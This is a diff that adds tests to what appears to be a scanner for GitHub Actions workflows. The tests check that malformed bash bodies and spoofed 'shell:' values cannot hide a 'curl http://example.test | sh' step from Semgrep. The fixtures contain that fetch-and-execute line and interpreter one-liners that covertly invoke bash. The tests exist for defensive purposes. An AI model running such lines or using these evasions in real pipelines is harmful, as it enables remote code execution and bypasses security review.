@@ -6399,3 +6399,144 @@ def test_tolerated_errors_do_not_suppress_findings_reported_alongside_them(
 
     assert result.returncode == 1
     assert "gha-curl-pipe-shell" in result.stdout
+
+
+_MALFORMED_EXPRESSION_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: bash\n"
+    "        run: |\n"
+    '          echo "${{ github.sha }}"\n'
+    "          curl http://example.test | sh\n"
+    "          function ( {\n"
+)
+
+_SPOOFED_SHELL_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: python3 -c \"import os,sys; os.system('bash ' + sys.argv[1])\" {0}\n"
+    "        run: |\n"
+    "          curl http://example.test | sh\n"
+    "          function ( {\n"
+)
+
+
+def test_semgrep_blocks_a_malformed_bash_body_that_carries_an_expression(
+    tmp_path: Path,
+) -> None:
+    """A deliberate syntax error must not ride an Actions expression to safety.
+
+    Semgrep reports zero findings and only parse errors for this body, so
+    tolerating the error would let ``curl | sh`` through unscanned.
+    """
+    target = tmp_path / "workflow.yml"
+    target.write_text(_MALFORMED_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _MALFORMED_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+def test_semgrep_blocks_a_shell_that_declares_python_but_invokes_bash(
+    tmp_path: Path,
+) -> None:
+    """A ``shell:`` value naming a second interpreter cannot be trusted."""
+    target = tmp_path / "workflow.yml"
+    target.write_text(_SPOOFED_SHELL_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _SPOOFED_SHELL_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "pwsh",
+        "pwsh -NoProfile -Command \"& '{0}'\"",
+        "python3 {0}",
+        "powershell.exe",
+    ],
+)
+def test_shells_naming_only_their_own_interpreter_are_non_bash(shell: str) -> None:
+    assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "python3 -c \"import os,sys; os.system('bash ' + sys.argv[1])\" {0}",
+        "python3 -c 'import subprocess; subprocess.run([\"sh\", \"x\"])'",
+        "node -e \"require('child_process').execSync('bash x')\"",
+        "perl -e 'exec q{zsh}'",
+    ],
+)
+def test_shells_naming_a_foreign_interpreter_are_not_treated_as_non_bash(shell: str) -> None:
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        'if [ "${{ github.sha }}" = "x" ]; then\n  echo hi\nfi\n',
+        "echo hello\n",
+        'echo "unterminated is fine when quoted properly"\n',
+    ],
+)
+def test_valid_shell_bodies_pass_the_syntax_check(body: str) -> None:
+    assert policy._body_is_valid_shell_syntax(body) is True
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "function ( {\n",
+        "if [ -f /tmp/x ]; then\n",
+        "case $x in\n",
+        'echo "unterminated\n',
+    ],
+)
+def test_malformed_shell_bodies_fail_the_syntax_check(body: str) -> None:
+    assert policy._body_is_valid_shell_syntax(body) is False
+
+
+def test_syntax_check_fails_closed_when_bash_is_unavailable(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """A missing or unusable bash must block rather than silently tolerate."""
+
+    def _explode(*_args: object, **_kwargs: object) -> None:
+        raise FileNotFoundError("bash")
+
+    policy._body_is_valid_shell_syntax.cache_clear()
+    monkeypatch.setattr(policy.subprocess, "run", _explode)
+    try:
+        assert policy._body_is_valid_shell_syntax("echo hi  # unique-for-cache\n") is False
+    finally:
+        policy._body_is_valid_shell_syntax.cache_clear()
+
+
+def test_syntax_check_fails_closed_when_bash_times_out(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    def _timeout(*_args: object, **_kwargs: object) -> None:
+        raise subprocess.TimeoutExpired(cmd=["bash", "-n"], timeout=1)
+
+    policy._body_is_valid_shell_syntax.cache_clear()
+    monkeypatch.setattr(policy.subprocess, "run", _timeout)
+    try:
+        assert policy._body_is_valid_shell_syntax("echo hi  # timeout-case\n") is False
+    finally:
+        policy._body_is_valid_shell_syntax.cache_clear()
+
+
+def test_expression_path_requires_a_parseable_body() -> None:
+    assert policy._step_defeats_bash_subparse("bash", 'echo "${{ github.sha }}"\n') is True
+    assert policy._step_defeats_bash_subparse("bash", 'echo "${{ github.sha }}"\nif [\n') is False
+
+
+def test_non_bash_shell_path_does_not_require_a_parseable_body() -> None:
+    """A Python step is legitimately unparseable as Bash and stays tolerated."""
+    assert policy._step_defeats_bash_subparse("python3 {0}", "print(os.getcwd())\n") is True
